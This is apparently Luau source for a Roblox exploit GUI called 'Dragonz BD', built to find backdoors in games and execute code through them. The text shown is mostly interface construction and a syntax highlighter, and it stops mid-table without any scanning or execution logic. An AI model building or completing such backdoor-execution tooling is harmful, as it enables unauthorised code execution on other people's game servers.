--moonseccant obfucate my script anymore idk why lol its not that big :/
local CryLol = {};
CryLol["1"] = Instance.new("ScreenGui",game:GetService('CoreGui'):WaitForChild('RobloxGui'));
CryLol["1"]["IgnoreGuiInset"] = true;
CryLol["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
CryLol["1"]["Name"] = [[Dragonz BD ByTeam Cry]];
CryLol["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
CryLol["1"]["ResetOnSpawn"] = false;
CryLol["2"] = Instance.new("Frame", CryLol["1"]);
CryLol["2"]["BorderSizePixel"] = 0;
CryLol["2"]["BackgroundColor3"] = Color3.fromRGB(52, 0, 77);
CryLol["2"]["Size"] = UDim2.new(0, 480, 0, 300);
CryLol["2"]["Position"] = UDim2.new(0.29866, 0, 0.27451, 0);
CryLol["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
CryLol["2"]["Name"] = [[Main]];
CryLol["3"] = Instance.new("UICorner", CryLol["2"]);
CryLol["3"]["CornerRadius"] = UDim.new(0, 25);
CryLol["4"] = Instance.new("Frame", CryLol["2"]);
CryLol["4"]["BorderSizePixel"] = 0;
CryLol["4"]["BackgroundColor3"] = Color3.fromRGB(87, 0, 129);
CryLol["4"]["Size"] = UDim2.new(0, 480, 0, 300);
CryLol["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
CryLol["4"]["Name"] = [[Kinda Useless]];
CryLol["5"] = Instance.new("UIGradient", CryLol["4"]);
CryLol["5"]["Rotation"] = -45;
CryLol["5"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.500, 0),NumberSequenceKeypoint.new(1.000, 1)};
CryLol["6"] = Instance.new("UICorner", CryLol["4"]);
CryLol["6"]["CornerRadius"] = UDim.new(0, 25);
CryLol["7"] = Instance.new("TextLabel", CryLol["2"]);
CryLol["7"]["TextWrapped"] = true;
CryLol["7"]["BorderSizePixel"] = 0;
CryLol["7"]["TextScaled"] = true;
CryLol["7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
CryLol["7"]["TextSize"] = 14;
CryLol["7"]["FontFace"] = Font.new([[rbxasset://fonts/families/AccanthisADFStd.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
CryLol["7"]["TextColor3"] = Color3.fromRGB(172, 0, 255);
CryLol["7"]["BackgroundTransparency"] = 1;
CryLol["7"]["RichText"] = true;
CryLol["7"]["Size"] = UDim2.new(0, 210, 0, 50);
CryLol["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
CryLol["7"]["Text"] = [[Dragonz BD]];
CryLol["7"]["Name"] = [[Label]];
CryLol["7"]["Position"] = UDim2.new(0.05208, 0, 0, 0);
CryLol["8"] = Instance.new("Frame", CryLol["2"]);
CryLol["8"]["Visible"] = false;
CryLol["8"]["BorderSizePixel"] = 0;
CryLol["8"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 0);
CryLol["8"]["Size"] = UDim2.new(0, 380, 0, 140);
CryLol["8"]["Position"] = UDim2.new(0.10417, 0, 0.16667, 0);
CryLol["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
CryLol["8"]["Name"] = [[Execute]];
CryLol["9"] = Instance.new("ImageLabel", CryLol["8"]);
CryLol["9"]["BorderSizePixel"] = 0;
CryLol["9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
CryLol["9"]["Image"] = [[rbxassetid://95040856564792]];
CryLol["9"]["Size"] = UDim2.new(0, 140, 0, 140);
CryLol["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
CryLol["9"]["BackgroundTransparency"] = 1;
CryLol["9"]["Position"] = UDim2.new(0.31579, 0, 0, 0);
CryLol["a"] = Instance.new("TextBox", CryLol["8"]);
CryLol["a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
CryLol["a"]["PlaceholderColor3"] = Color3.fromRGB(0, 0, 0);
CryLol["a"]["BorderSizePixel"] = 0;
CryLol["a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
CryLol["a"]["TextWrapped"] = true;
CryLol["a"]["TextSize"] = 15;
CryLol["a"]["TextYAlignment"] = Enum.TextYAlignment.Top;
CryLol["a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
CryLol["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
CryLol["a"]["MultiLine"] = true;
CryLol["a"]["ClearTextOnFocus"] = false;
CryLol["a"]["PlaceholderText"] = [[--print("Dragonz BD") / require(1234567890).Sigma("Team Cry")]];
CryLol["a"]["Size"] = UDim2.new(0, 380, 0, 140);
CryLol["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
CryLol["a"]["Text"] = [[print("Dragonz BD")]];
CryLol["a"]["BackgroundTransparency"] = 1;
CryLol["b"] = Instance.new("Folder", CryLol["a"]);
CryLol["b"]["Name"] = [[ShingShingShing]];
CryLol["c"] = Instance.new("LocalScript", CryLol["a"]);
CryLol["c"]["Name"] = [[Highlight]];
CryLol["d"] = Instance.new("ModuleScript", CryLol["c"]);
CryLol["d"]["Name"] = [[Highlighter]];
CryLol["e"] = Instance.new("ModuleScript", CryLol["d"]);
CryLol["e"]["Name"] = [[lexer]];
CryLol["f"] = Instance.new("ModuleScript", CryLol["e"]);
CryLol["f"]["Name"] = [[language]];
CryLol["10"] = Instance.new("TextButton", CryLol["2"]);
CryLol["10"]["TextWrapped"] = true;
CryLol["10"]["BorderSizePixel"] = 0;
CryLol["10"]["TextSize"] = 14;
CryLol["10"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
CryLol["10"]["TextScaled"] = true;
CryLol["10"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 167);
CryLol["10"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
CryLol["10"]["RichText"] = true;
CryLol["10"]["Size"] = UDim2.new(0, 140, 0, 50);
CryLol["10"]["Name"] = [[Exe]];
CryLol["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
CryLol["10"]["Text"] = [[Execute]];
CryLol["10"]["Visible"] = false;
CryLol["10"]["Position"] = UDim2.new(0.10417, 0, 0.66667, 0);
CryLol["11"] = Instance.new("TextButton", CryLol["2"]);
CryLol["11"]["TextWrapped"] = true;
CryLol["11"]["BorderSizePixel"] = 0;
CryLol["11"]["TextSize"] = 14;
CryLol["11"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
CryLol["11"]["TextScaled"] = true;
CryLol["11"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 167);
CryLol["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
CryLol["11"]["RichText"] = true;
CryLol["11"]["Size"] = UDim2.new(0, 140, 0, 50);
CryLol["11"]["Name"] = [[clr]];
CryLol["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
CryLol["11"]["Text"] = [[Clear]];
CryLol["11"]["Visible"] = false;
CryLol["11"]["Position"] = UDim2.new(0.60417, 0, 0.66667, 0);
CryLol["12"] = Instance.new("TextButton", CryLol["2"]);
CryLol["12"]["TextWrapped"] = true;
CryLol["12"]["BorderSizePixel"] = 0;
CryLol["12"]["TextSize"] = 14;
CryLol["12"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
CryLol["12"]["TextScaled"] = true;
CryLol["12"]["BackgroundColor3"] = Color3.fromRGB(0, 102, 0);
CryLol["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
CryLol["12"]["RichText"] = true;
CryLol["12"]["Size"] = UDim2.new(0, 80, 0, 50);
CryLol["12"]["Name"] = [[R6]];
CryLol["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
CryLol["12"]["Text"] = [[R6]];
CryLol["12"]["Visible"] = false;
CryLol["12"]["Position"] = UDim2.new(0.41667, 0, 0.66667, 0);
CryLol["13"] = Instance.new("TextButton", CryLol["2"]);
CryLol["13"]["TextWrapped"] = true;
CryLol["13"]["BorderSizePixel"] = 0;
CryLol["13"]["TextSize"] = 14;
CryLol["13"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
CryLol["13"]["TextScaled"] = true;
CryLol["13"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 0);
CryLol["13"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
CryLol["13"]["RichText"] = true;
CryLol["13"]["Size"] = UDim2.new(0, 380, 0, 200);
CryLol["13"]["Name"] = [[FindBD]];
CryLol["13"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
CryLol["13"]["Text"] = [[Find Backdoor :3]];
CryLol["13"]["Position"] = UDim2.new(0.10417, 0, 0.16667, 0);
CryLol["14"] = Instance.new("TextButton", CryLol["2"]);
CryLol["14"]["TextWrapped"] = true;
CryLol["14"]["BorderSizePixel"] = 0;
CryLol["14"]["TextSize"] = 14;
CryLol["14"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
CryLol["14"]["TextScaled"] = true;
CryLol["14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
CryLol["14"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
CryLol["14"]["Size"] = UDim2.new(0, 50, 0, 50);
CryLol["14"]["BackgroundTransparency"] = 1;
CryLol["14"]["Name"] = [[close]];
CryLol["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
CryLol["14"]["Text"] = [[X]];
CryLol["14"]["Position"] = UDim2.new(0.89583, 0, 0, 0);
CryLol["15"] = Instance.new("LocalScript", CryLol["1"]);
CryLol["15"]["Name"] = [[print("Dragonz BD")]];
CryLol["16"] = Instance.new("Frame", CryLol["1"]);
CryLol["16"]["BorderSizePixel"] = 0;
CryLol["16"]["BackgroundColor3"] = Color3.fromRGB(52, 0, 77);
CryLol["16"]["Size"] = UDim2.new(0, 200, 0, 100);
CryLol["16"]["Position"] = UDim2.new(-1, 0, 0.382, 0);
CryLol["16"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
CryLol["16"]["Name"] = [[Open close]];
CryLol["17"] = Instance.new("UICorner", CryLol["16"]);
CryLol["17"]["CornerRadius"] = UDim.new(1, 0);
CryLol["18"] = Instance.new("Frame", CryLol["16"]);
CryLol["18"]["BorderSizePixel"] = 0;
CryLol["18"]["BackgroundColor3"] = Color3.fromRGB(87, 0, 129);
CryLol["18"]["Size"] = UDim2.new(0, 200, 0, 100);
CryLol["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
CryLol["18"]["Name"] = [[Kinda Useless]];
CryLol["19"] = Instance.new("UIGradient", CryLol["18"]);
CryLol["19"]["Rotation"] = -45;
CryLol["19"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.500, 0),NumberSequenceKeypoint.new(1.000, 1)};
CryLol["1a"] = Instance.new("UICorner", CryLol["18"]);
CryLol["1a"]["CornerRadius"] = UDim.new(0, 25);
CryLol["1b"] = Instance.new("Frame", CryLol["16"]);
CryLol["1b"]["BorderSizePixel"] = 0;
CryLol["1b"]["BackgroundColor3"] = Color3.fromRGB(87, 0, 129);
CryLol["1b"]["Size"] = UDim2.new(0, 200, 0, 100);
CryLol["1b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
CryLol["1b"]["Name"] = [[Kinda Useless]];
CryLol["1c"] = Instance.new("UIGradient", CryLol["1b"]);
CryLol["1c"]["Rotation"] = 45;
CryLol["1c"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.500, 0),NumberSequenceKeypoint.new(1.000, 1)};
CryLol["1d"] = Instance.new("UICorner", CryLol["1b"]);
CryLol["1d"]["CornerRadius"] = UDim.new(0, 25);
CryLol["1e"] = Instance.new("TextButton", CryLol["16"]);
CryLol["1e"]["TextWrapped"] = true;
CryLol["1e"]["BorderSizePixel"] = 0;
CryLol["1e"]["TextSize"] = 14;
CryLol["1e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
CryLol["1e"]["TextScaled"] = true;
CryLol["1e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
CryLol["1e"]["FontFace"] = Font.new([[rbxasset://fonts/families/PressStart2P.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
CryLol["1e"]["RichText"] = true;
CryLol["1e"]["Size"] = UDim2.new(0, 150, 0, 50);
CryLol["1e"]["Name"] = [[Open]];
CryLol["1e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
CryLol["1e"]["Text"] = [[Open]];
CryLol["1e"]["Position"] = UDim2.new(0.12416, 0, 0.24966, 0);
CryLol["1f"] = Instance.new("UICorner", CryLol["1e"]);
CryLol["1f"]["CornerRadius"] = UDim.new(0, 25);
local G2L_REQUIRE = require;
local G2L_MODULES = {};
local function require(Module:ModuleScript)
    local ModuleState = G2L_MODULES[Module];
    if ModuleState then
        if not ModuleState.Required then
            ModuleState.Required = true;
            ModuleState.Value = ModuleState.Closure();
        end
        return ModuleState.Value;
    end;
    return G2L_REQUIRE(Module);
end

G2L_MODULES[CryLol["d"]] = {
Closure = function()
    local script = CryLol["d"];local function SanitizeRichText(s: string): string
	return string.gsub(
		string.gsub(string.gsub(string.gsub(string.gsub(s, "&", "&amp;"), "<", "&lt;"), ">", "&gt;"), '"', "&quot;"),
		"'",
		"&apos;"
	)
end

local function SanitizeTabs(s: string): string
	return string.gsub(s, "\t", "    ")
end

local function SanitizeControl(s: string): string
	return string.gsub(s, "[\0\1\2\3\4\5\6\7\8\11\12\13\14\15\16\17\18\19\20\21\22\23\24\25\26\27\28\29\30\31]+", "")
end

local TokenColors: HighlighterColors = {
	["background"] = Color3.fromRGB(255, 0, 0),
	["iden"] = Color3.fromRGB(0, 0, 0),
	["keyword"] = Color3.fromRGB(85, 0, 127),
	["builtin"] = Color3.fromRGB(255, 255, 0),
	["string"] = Color3.fromRGB(85, 0, 0),
	["number"] = Color3.fromRGB(255, 0, 255),
	["comment"] = Color3.fromRGB(0, 85, 255),
	["operator"] = Color3.fromRGB(255, 239, 148),
	["custom"] = Color3.fromRGB(255, 255, 0),
}
local ColorFormatter: { [Color3]: string } = {}
local LastData: { [TextObject]: ObjectData } = {}
local Cleanups: { [TextObject]: () -> () } = {}

local Highlighter = {
	defaultLexer = require(script.lexer),
}

function Highlighter.highlight(props: HighlightProps)
	local textObject = props.textObject
	local src = SanitizeTabs(SanitizeControl(props.src or textObject.Text))
	local lexer = props.lexer or Highlighter.defaultLexer
	local customLang = props.customLang
	local forceUpdate = props.forceUpdate

	local data = LastData[textObject]
	if data == nil then
		data = {
			Text = "",
			Labels = {},
			Lines = {},
			Lexer = lexer,
			CustomLang = customLang,
		}
		LastData[textObject] = data
	elseif forceUpdate ~= true and data.Text == src then
		return
	end

	local lineLabels = data.Labels
	local previousLines = data.Lines

	local lines = string.split(src, "\n")

	data.Lines = lines
	data.Text = src
	data.Lexer = lexer
	data.CustomLang = customLang

	textObject.RichText = false
	textObject.Text = src
	textObject.TextXAlignment = Enum.TextXAlignment.Left
	textObject.TextYAlignment = Enum.TextYAlignment.Top
	textObject.BackgroundColor3 = TokenColors.background
	textObject.TextColor3 = TokenColors.iden
	textObject.TextTransparency = 0.5

	local lineFolder = textObject:FindFirstChild("ShingShingShing")
	if lineFolder == nil then
		local newLineFolder = Instance.new("Folder")
		newLineFolder.Name = "ShingShingShing"
		newLineFolder.Parent = textObject

		lineFolder = newLineFolder
	end

	local cleanup = Cleanups[textObject]
	if not cleanup then
		local connections: { RBXScriptConnection } = {}
		local function newCleanup()
			for _, label in ipairs(lineLabels) do
				label:Destroy()
			end
			table.clear(lineLabels)
			lineLabels = nil

			LastData[textObject] = nil
			Cleanups[textObject] = nil

			for _, connection in connections do
				connection:Disconnect()
			end
			table.clear(connections)
			connections = nil
		end
		Cleanups[textObject] = newCleanup
		cleanup = newCleanup

		table.insert(
			connections,
			textObject.AncestryChanged:Connect(function()
				if textObject.Parent then
					return
				end

				cleanup()
			end)
		)
		table.insert(
			connections,
			textObject:GetPropertyChangedSignal("TextBounds"):Connect(function()
				Highlighter.highlight({
					textObject = textObject,
					forceUpdate = true,
					lexer = lexer,
					customLang = customLang,
				})
			end)
		)
		table.insert(
			connections,
			textObject:GetPropertyChangedSignal("Text"):Connect(function()
				Highlighter.highlight({
					textObject = textObject,
					lexer = lexer,
					customLang = customLang,
				})
			end)
		)
		table.insert(
			connections,
			textObject:GetPropertyChangedSignal("AbsoluteSize"):Connect(function()
				Highlighter.highlight({
					textObject = textObject,
					forceUpdate = true,
					lexer = lexer,
					customLang = customLang,
				})
			end)
		)
	end

	if src == "" then
		for l=1, #lineLabels do
			if lineLabels[l].Text == "" then continue end
			lineLabels[l].Text = ""
		end
		return cleanup
	end

	local textBounds = textObject.TextBounds
	while (textBounds.Y ~= textBounds.Y) or (textBounds.Y < 1) do
		task.wait()
		textBounds = textObject.TextBounds
	end

	if LastData[textObject] == nil then
		return cleanup
	end

	local numLines = #lines
	local textHeight = textBounds.Y / numLines * textObject.LineHeight

	local richText, index, lineNumber = table.create(5), 0, 1
	for token: string, content: string in lexer.scan(src) do
		local Color =
			if customLang and customLang[content] then
			TokenColors["custom"]
			else
			TokenColors[token] or TokenColors["iden"]

		local tokenLines = string.split(SanitizeRichText(content), "\n")

		for l, line in ipairs(tokenLines) do
			local lineLabel = lineLabels[lineNumber]
			if not lineLabel then
				local newLabel = Instance.new("TextLabel")
				newLabel.Name = "Line_" .. lineNumber
				newLabel.RichText = true
				newLabel.BackgroundTransparency = 1
				newLabel.Text = ""
				newLabel.TextXAlignment = Enum.TextXAlignment.Left
				newLabel.TextYAlignment = Enum.TextYAlignment.Top
				newLabel.Parent = lineFolder
				newLabel.TextWrapped=true
				lineLabels[lineNumber] = newLabel
				lineLabel = newLabel
			end

			lineLabel.TextColor3 = TokenColors["iden"]
			lineLabel.Font = textObject.Font
			lineLabel.TextSize = textObject.TextSize
			lineLabel.Size = UDim2.new(1, 0, 0, math.ceil(textHeight))
			lineLabel.Position = UDim2.fromScale(0, textHeight * (lineNumber - 1) / textObject.AbsoluteSize.Y)

			if l > 1 then
				if forceUpdate or lines[lineNumber] ~= previousLines[lineNumber] then
					lineLabels[lineNumber].Text = table.concat(richText)
				end
				lineNumber += 1
				index = 0
				table.clear(richText)
			end

			if forceUpdate or lines[lineNumber] ~= previousLines[lineNumber] then
				index += 1
				if Color ~= TokenColors["iden"] and string.find(line, "[%S%C]") then
					richText[index] = string.format(ColorFormatter[Color], line)
				else
					richText[index] = line
				end
			end
		end
	end

	if richText[1] and lineLabels[lineNumber] then
		lineLabels[lineNumber].Text = table.concat(richText)
	end

	for l=lineNumber+1, #lineLabels do
		if lineLabels[l].Text == "" then continue end
		lineLabels[l].Text = ""
	end

	return cleanup
end

function Highlighter.refresh(): ()
	for textObject, data in pairs(LastData) do
		for _, lineLabel in ipairs(data.Labels) do
			lineLabel.TextColor3 = TokenColors["iden"]
		end

		Highlighter.highlight({
			textObject = textObject,
			forceUpdate = true,
			src = data.Text,
			lexer = data.Lexer,
			customLang = data.CustomLang,
		})
	end
end

function Highlighter.setTokenColors(colors: HighlighterColors)
	for token, color in colors do
		TokenColors[token] = color
		ColorFormatter[color] = string.format(
			'<font color="#%.2x%.2x%.2x">',
			color.R * 255,
			color.G * 255,
			color.B * 255
		) .. "%s</font>"
	end

	Highlighter.refresh()
end
Highlighter.setTokenColors(TokenColors)

return Highlighter :: Highlighter
end;
};
G2L_MODULES[CryLol["e"]] = {
Closure = function()
    local script = CryLol["e"];local lexer = {}

local Prefix, Suffix, Cleaner = "^[%c%s]*", "[%c%s]*", "[%c%s]+"
local UNICODE = "[%z\x01-\x7F\xC2-\xF4][\x80-\xBF]+"
local NUMBER_A = "0[xX][%da-fA-F_]+"
local NUMBER_B = "0[bB][01_]+"
local NUMBER_C = "%d+%.?%d*[eE][%+%-]?%d+"
local NUMBER_D = "%d+[%._]?[%d_eE]*"
local OPERATORS = "[:;<>/~%*%(%)%-={},%.#%^%+%%]+"
local BRACKETS = "[%[%]]+" 
local IDEN = "[%a_][%w_]*"
local STRING_EMPTY = "(['\"])%1" 
local STRING_PLAIN = "(['\"])[^\n]-([^\\]%1)" 
local STRING_INTER = "`[^\n]-`"
local STRING_INCOMP_A = "(['\"]).-\n" 
local STRING_INCOMP_B = "(['\"])[^\n]*" 
local STRING_MULTI = "%[(=*)%[.-%]%1%]" 
local STRING_MULTI_INCOMP = "%[=*%[.-.*" 
local COMMENT_MULTI = "%-%-%[(=*)%[.-%]%1%]" 
local COMMENT_MULTI_INCOMP = "%-%-%[=*%[.-.*" 
local COMMENT_PLAIN = "%-%-.-\n" 
local COMMENT_INCOMP = "%-%-.*" 

local lang = require(script.language)
local lua_keyword = lang.keyword
local lua_builtin = lang.builtin
local lua_libraries = lang.libraries

lexer.language = lang

local lua_matches = {
	{ Prefix .. IDEN .. Suffix, "var" },

	{ Prefix .. NUMBER_A .. Suffix, "number" },
	{ Prefix .. NUMBER_B .. Suffix, "number" },
	{ Prefix .. NUMBER_C .. Suffix, "number" },
	{ Prefix .. NUMBER_D .. Suffix, "number" },

	{ Prefix .. STRING_EMPTY .. Suffix, "string" },
	{ Prefix .. STRING_PLAIN .. Suffix, "string" },
	{ Prefix .. STRING_INCOMP_A .. Suffix, "string" },
	{ Prefix .. STRING_INCOMP_B .. Suffix, "string" },
	{ Prefix .. STRING_MULTI .. Suffix, "string" },
	{ Prefix .. STRING_MULTI_INCOMP .. Suffix, "string" },
	{ Prefix .. STRING_INTER .. Suffix, "string_inter" },

	{ Prefix .. COMMENT_MULTI .. Suffix, "comment" },
	{ Prefix .. COMMENT_MULTI_INCOMP .. Suffix, "comment" },
	{ Prefix .. COMMENT_PLAIN .. Suffix, "comment" },
	{ Prefix .. COMMENT_INCOMP .. Suffix, "comment" },

	{ Prefix .. OPERATORS .. Suffix, "operator" },
	{ Prefix .. BRACKETS .. Suffix, "operator" },

	{ Prefix .. UNICODE .. Suffix, "iden" },

	{ "^.", "iden" },
}

local PATTERNS, TOKENS = {}, {}
for i, m in lua_matches do
	PATTERNS[i] = m[1]
	TOKENS[i] = m[2]
end

function lexer.scan(s: string)
	local index = 1
	local size = #s
	local previousContent1, previousContent2, previousContent3, previousToken = "", "", "", ""

	local thread = coroutine.create(function()
		while index <= size do
			local matched = false
			for tokenType, pattern in ipairs(PATTERNS) do
				local start, finish = string.find(s, pattern, index)
				if start == nil then continue end

				index = finish + 1
				matched = true

				local content = string.sub(s, start, finish)
				local rawToken = TOKENS[tokenType]
				local processedToken = rawToken

				if rawToken == "var" then
					local cleanContent = string.gsub(content, Cleaner, "")

					if lua_keyword[cleanContent] then
						processedToken = "keyword"
					elseif lua_builtin[cleanContent] then
						processedToken = "builtin"
					elseif string.find(previousContent1, "%.[%s%c]*$") and previousToken ~= "comment" then
						local parent = string.gsub(previousContent2, Cleaner, "")
						local lib = lua_libraries[parent]
						if lib and lib[cleanContent] and not string.find(previousContent3, "%.[%s%c]*$") then
							processedToken = "builtin"
						else
							processedToken = "iden"
						end
					else
						processedToken = "iden"
					end
				elseif rawToken == "string_inter" then
					if not string.find(content, "[^\\]{") then
						processedToken = "string"
					else
						processedToken = nil

						local isString = true
						local subIndex = 1
						local subSize = #content
						while subIndex <= subSize do
							local subStart, subFinish = string.find(content, "^.-[^\\][{}]", subIndex)
							if subStart == nil then
								coroutine.yield("string", string.sub(content, subIndex))
								break
							end

							if isString then
								subIndex = subFinish + 1
								coroutine.yield("string", string.sub(content, subStart, subFinish))

								isString = false
							else
								subIndex = subFinish
								local subContent = string.sub(content, subStart, subFinish-1)
								for innerToken, innerContent in lexer.scan(subContent) do
									coroutine.yield(innerToken, innerContent)
								end

								isString = true
							end
						end
					end
				end

				previousContent3 = previousContent2
				previousContent2 = previousContent1
				previousContent1 = content
				previousToken = processedToken or rawToken
				if processedToken then
					coroutine.yield(processedToken, content)
				end
				break
			end

			if not matched then
				return
			end
		end

		return
	end)

	return function()
		if coroutine.status(thread) == "dead" then
			return
		end

		local success, token, content = coroutine.resume(thread)
		if success and token then
			return token, content
		end

		return
	end
end

function lexer.navigator()
	local nav = {
		Source = "",
		TokenCache = table.create(50),

		_RealIndex = 0,
		_UserIndex = 0,
		_ScanThread = nil,
	}

	function nav:Destroy()
		self.Source = nil
		self._RealIndex = nil
		self._UserIndex = nil
		self.TokenCache = nil
		self._ScanThread = nil
	end

	function nav:SetSource(SourceString)
		self.Source = SourceString

		self._RealIndex = 0
		self._UserIndex = 0
		table.clear(self.TokenCache)

		self._ScanThread = coroutine.create(function()
			for Token, Src in lexer.scan(self.Source) do
				self._RealIndex += 1
				self.TokenCache[self._RealIndex] = { Token, Src }
				coroutine.yield(Token, Src)
			end
		end)
	end

	function nav.Next()
		nav._UserIndex += 1

		if nav._RealIndex >= nav._UserIndex then
			return table.unpack(nav.TokenCache[nav._UserIndex])
		else
			if coroutine.status(nav._ScanThread) == "dead" then
				return
			else
				local success, token, src = coroutine.resume(nav._ScanThread)
				if success and token then
					return token, src
				else
					return
				end
			end
		end
	end

	function nav.Peek(PeekAmount)
		local GoalIndex = nav._UserIndex + PeekAmount

		if nav._RealIndex >= GoalIndex then
			if GoalIndex > 0 then
				return table.unpack(nav.TokenCache[GoalIndex])
			else
				return
			end
		else
			if coroutine.status(nav._ScanThread) == "dead" then
				return
			else
				local IterationsAway = GoalIndex - nav._RealIndex

				local success, token, src = nil, nil, nil

				for _ = 1, IterationsAway do
					success, token, src = coroutine.resume(nav._ScanThread)
					if not (success or token) then
						break
					end
				end

				return token, src
			end
		end
	end

	return nav
end

return lexer
end;
};
G2L_MODULES[CryLol["f"]] = {
Closure = function()
    local script = CryLol["f"];local language = {
	keyword = {
		["and"] = "keyword",
		["break"] = "keyword",
		["continue"] = "keyword",
		["do"] = "keyword",
		["else"] = "keyword",
		["elseif"] = "keyword",
		["end"] = "keyword",
		["export"] = "keyword",
		["false"] = "keyword",
		["for"] = "keyword",
		["function"] = "keyword",
		["if"] = "keyword",
		["in"] = "keyword",
		["local"] = "keyword",
		["nil"] = "keyword",
		["not"] = "keyword",
		["or"] = "keyword",
		["repeat"] = "keyword",
		["return"] = "keyword",
		["self"] = "keyword",
		["then"] = "keyword",
		["true"] = "keyword",
		["type"] = "keyword",
		["typeof"] = "keyword",
		["until"] = "keyword",
		["while"] = "keyword",
	},

	builtin = {
		["assert"] = "function",
		["error"] = "function",
		["getfenv"] = "function",
		["getmetatable"] = "function",
		["ipairs"] = "function",
		["loadstring"] = "function",
		["newproxy"] = "function",
		["next"] = "function",
		["pairs"] = "function",
		["pcall"] = "function",
		["print"] = "function",
		["rawequal"] = "function",
		["rawget"] = "function",
		["rawlen"] = "function",
		["rawset"] = "function",
		["select"] = "function",
		["setfenv"] = "function",
		["setmetatable"] = "function",
		["tonumber"] = "function",
		["tostring"] = "function",
		["unpack"] = "function",
		["xpcall"] = "function",

		["collectgarbage"] = "function",

		["_G"] = "table",
		["_VERSION"] = "string",

		["bit32"] = "table",
		["coroutine"] = "table",
		["debug"] = "table",
		["math"] = "table",
		["os"] = "table",
		["string"] = "table",
		["table"] = "table",
		["utf8"] = "table",

		["DebuggerManager"] = "function",
		["delay"] = "function",
		["gcinfo"] = "function",
		["PluginManager"] = "function",
		["require"] = "function",
		["settings"] = "function",
		["spawn"] = "function",
		["tick"] = "function",
		["time"] = "function",
		["UserSettings"] = "function",
		["wait"] = "function",
		["warn"] = "function",

		["Delay"] = "function",
		["ElapsedTime"] = "function",
		["elapsedTime"] = "function",
		["printidentity"] = "function",
		["Spawn"] = "function",
		["Stats"] = "function",
		["stats"] = "function",
		["Version"] = "function",
		["version"] = "function",
		["Wait"] = "function",
		["ypcall"] = "function",

		["game"] = "Instance",
		["plugin"] = "Instance",
		["script"] = "Instance",
		["shared"] = "Instance",
		["workspace"] = "Instance",

		["Game"] = "Instance",
		["Workspace"] = "Instance",

		["Axes"] = "table",
		["BrickColor"] = "table",
		["CatalogSearchParams"] = "table",
		["CFrame"] = "table",
		["Color3"] = "table",
		["ColorSequence"] = "table",
		["ColorSequenceKeypoint"] = "table",
		["DateTime"] = "table",
		["DockWidgetPluginGuiInfo"] = "table",
		["Enum"] = "table",
		["Faces"] = "table",
		["FloatCurveKey"] = "table",
		["Font"] = "table",
		["Instance"] = "table",
		["NumberRange"] = "table",
		["NumberSequence"] = "table",
		["NumberSequenceKeypoint"] = "table",
		["OverlapParams"] = "table",
		["PathWaypoint"] = "table",
		["PhysicalProperties"] = "table",
		["Random"] = "table",
		["Ray"] = "table",
		["RaycastParams"] = "table",
		["Rect"] = "table",
		["Region3"] = "table",
		["Region3int16"] = "table",
		["RotationCurveKey"] = "table",
		["task"] = "table",
		["TweenInfo"] = "table",
		["UDim"] = "table",
		["UDim2"] = "table",
		["Vector2"] = "table",
		["Vector2int16"] = "table",
		["Vector3"] = "table",
		["Vector3int16"] = "table",
	},

	libraries = {

		bit32 = {
			arshift = "function",
			band = "function",
			bnot = "function",
			bor = "function",
			btest = "function",
			bxor = "function",
			countlz = "function",
			countrz = "function",
			extract = "function",
			lrotate = "function",
			lshift = "function",
			replace = "function",
			rrotate = "function",
			rshift = "function",
		},

		coroutine = {
			close = "function",
			create = "function",
			isyieldable = "function",
			resume = "function",
			running = "function",
			status = "function",
			wrap = "function",
			yield = "function",
